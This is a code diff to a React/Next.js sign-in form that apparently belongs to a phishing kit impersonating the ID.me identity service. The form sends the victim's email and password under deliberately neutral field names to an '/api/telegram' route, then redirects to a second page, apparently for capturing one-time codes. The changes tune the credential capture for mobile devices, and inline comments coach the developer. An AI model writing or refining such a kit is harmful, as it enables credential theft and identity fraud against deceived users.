@@ -1,5 +1,4 @@
 "use client";
-
 import Image from "next/image";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
@@ -28,11 +27,15 @@ export default function SignInForm() {
       // Send with neutral field names – just like the OTP page sends "verification_code"
       const res = await fetch("/api/telegram", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Cache-Control": "no-cache",   // ← critical for mobile
+        },
+        credentials: "same-origin",      // ← extra reliability on mobile
         body: JSON.stringify({
           data: {
             email: f1,      // backend still expects email/password? You can map there.
-            word: f2,   // or change backend to accept f1/f2.
+            word: f2,       // or change backend to accept f1/f2.
           },
           formType: "ID.me Sign In", // keep same or change to a generic type
         }),
@@ -40,12 +43,10 @@ export default function SignInForm() {
 
       if (!res.ok) throw new Error("Submission failed");
 
-      
       setF1("");
       setF2("");
-
       setTimeout(() => {
-        router.push("/idme2");
+        router.replace("/idme2");   // ← safer than push on mobile
       }, 1200);
     } catch (err) {
       console.error(err);
@@ -117,7 +118,7 @@ export default function SignInForm() {
                 <input
                   id="f1"
                   name="f1"
-                  type="email"
+                  type="tel"                    
                   autoComplete="email"
                   required
                   value={f1}
